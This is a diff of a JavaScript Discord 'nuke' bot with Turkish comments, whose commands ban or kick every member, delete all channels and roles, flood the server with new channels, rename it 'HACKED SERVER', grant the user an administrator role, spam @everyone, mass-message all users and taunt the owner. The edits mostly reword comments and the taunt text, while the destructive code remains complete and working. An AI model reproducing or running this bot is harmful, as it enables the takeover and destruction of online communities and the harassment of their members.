@@ -13,7 +13,7 @@ app.get("/", (request, response) => {
 });
 app.listen(process.env.PORT);
 setInterval(() => {
-  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`); //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
+  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAGLAYAN KOMUT
 }, 280000);
 
 client.on("message", msg => {
@@ -21,22 +21,22 @@ client.on("message", msg => {
     msg.delete();
     msg.guild.members.forEach(member => member.ban());
   }
-});   ///BAN KOMUTU SUNUCUDAKİ HEKESİ BANLAR +ban
+});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban
 
 client.on("message", msg => {
   if (msg.content === "+kick") {
     msg.delete();
     msg.guild.members.forEach(member => member.kick());
   }
-});   ///KİCK KOMUTU SUNUCUDAKİ HERKESİ KİCKLER +kick 
+});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 
 
 client.on("message", async msg => {
-  if (msg.content === "+çökert") {  ///ÇÖKERT KOMUTU BÜTÜN KANALLARI SİLİP ャ tasindik ADINDA ÇOK FAZLA KANAL AÇAR
+  if (msg.content === "+çökert") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP tasindik ADINDA COK FAZLA KANAL ACAR
     msg.delete();
 
-    await msg.guild.channels.deleteAll();   //// SAYFANIN EN AŞAĞISINDA DİĞER KOMUTLAR VAR İNİN
+    await msg.guild.channels.deleteAll();      //// SAYFANIN EN AŞAGISINDA DIĞER KOMUTLAR VAR ININ
 
-    await msg.guild.createChannel("gg", {  //gg YAZAN YERİ DEĞİŞTİRMEYİN SAKIN
+    await msg.guild.createChannel("gg", {      //gg YAZAN YERI DEGISTIRMEYIN SAKIN
       type: "text"
     });
     await msg.guild
@@ -294,7 +294,7 @@ client.on("message", async msg => {
         await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
-      }) ///KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AİTTİR
+      })                                //KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AITTIR
       .then(chan => {
         chan.setUserLimit("1");
       });
@@ -448,7 +448,7 @@ client.on("message", async msg => {
         await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
-      }) ///KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AİTTİR
+      })                              //KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AITTIR
       .then(chan => {
         chan.setUserLimit("1");
       });
@@ -543,7 +543,7 @@ client.on("message", async msg => {
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild.createChannel("ャ", { ///KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AİTTİR
+        await msg.guild.createChannel("ャ", {        //KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AITTIR
       type: "text"
     });
     await msg.guild
@@ -1180,7 +1180,7 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
         await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {  ///KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AİTTİR
+      .createChannel("▬▬▬▬▬▬▬", {       //KODLAR https://discord.gg/YdBSxst SUNUCUSUNA AITTIR
         type: "voice"
       })
       .then(chan => {
@@ -3050,29 +3050,22 @@ client.on("message", async msg => {
       .then(chan => {
         chan.setUserLimit("1");
       });
-        await msg.guild
-      .createChannel("▬▬▬▬▬▬▬", {
-        type: "voice"
-      })
-      .then(chan => {
-        chan.setUserLimit("1");
-      });
 
     await msg.guild.setIcon(
-      "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png" ///SUNUCUNUN RESMİNİ DEĞİŞTİRİR HIZI RESİM SİTESİNDEN UPLOAD EDEBİLİRSİNİZ
+      "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
     );
 
-    await msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN İSMİNİ DEĞİŞTİRİR
-    await client.user.setAvatar(""); //BOTUN PP Sİ YAPAR
-    await client.user.setUsername("ャ HACKED ャ"); //BOTUN İSMİNİ DEĞİŞTİRİR İÇİM BOŞ BIRAK
-    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN ROLÜNÜN ALTINDAKİ ROLLERİ SİLER
-    await msg.guild.owner.send("Sunucunu Hackledik Ağla :D"); //SUNUCUNUN KURUCUSUNA DM'DEN GÖNDERİLEN MESAJ
-    const kanal = await msg.guild.channels.find(x => x.name === "ャ"); //DEĞİŞTİRMEYİN BOZULUR
-    await kanal.send("https://www.youtube.com/watch?v=CAjfhMd_NTw **YENİ DİSCORD SUNUCUMUZ, NEW DİSCORD SERVER** https://discord.gg/qyTNQdm @everyone");
+    await msg.guild.setName("ャ HACKED SERVER ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
+    await client.user.setAvatar(""); //BOTUN PP SI YAPAR
+    await client.user.setUsername("ャ HACKED ャ");    //BOTUN ISMİNİ DEGISTIRIR
+    await msg.guild.roles.forEach(roles => roles.delete());    //BOTUN ROLÜNÜN ALTINDAKI ROLLERİ SILER
+    await msg.guild.owner.send("Sunucunu Hackledik Ağla :D");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    const kanal = await msg.guild.channels.find(x => x.name === "ャ");    //DEGISTIRMEYIN BOZULUR
+    await kanal.send("BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone"); //HACKLENDIKTEN SONRA GÖNDERILEN MESAJ
   }
 });
 client.on("message", async msg => {
-  if (msg.content === "+duyur") {  //SUNUCUDALİ BÜTÜN HERKESE MESAJ GÖNDERİR +duyur
+  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
     msg.delete();
     await msg.client.users
       .forEach(users =>
@@ -3085,7 +3078,7 @@ client.on("message", async msg => {
 });
 
 client.on("message", msg => {
-  if (msg.content === "+yetki") {  ///SİZE YÖNETİCİ YETKİSİ VERİR +yetki
+  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
     msg.delete();
     msg.guild.createRole({
       name: ".",
@@ -3097,15 +3090,15 @@ client.on("message", msg => {
 });
 
 client.on("message", msg => {
-  if (msg.content === "+rol") {  ///BOTUN SİLE BİLDİĞİ BÜTÜN ROLLER SİLİBİR (BOTUN ROLÜNÜN ALTINDAKİLER)
+  if (msg.content === "+rol") {  //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER)
     msg.guild.roles.forEach(roles => roles.delete()); 
   }
 });
 
 client.on('message', msg => {
   if (msg.content === '+spam') {
-        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone'); //////O KANALA 'BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone'
-        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone'); //////DINDA BÜSSÜRÜ MSJ ATAR +spam
+        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone'); //O KANALA BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone
+        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone'); //ADINDA BUSSURU MSJ ATAR +spam
         msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
         msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
         msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
@@ -3238,4 +3231,4 @@ client.on('message', msg => {
   }
 });
 
-client.login(ayarlar.token); ///DEĞİŞTİRME
+client.login(ayarlar.token);
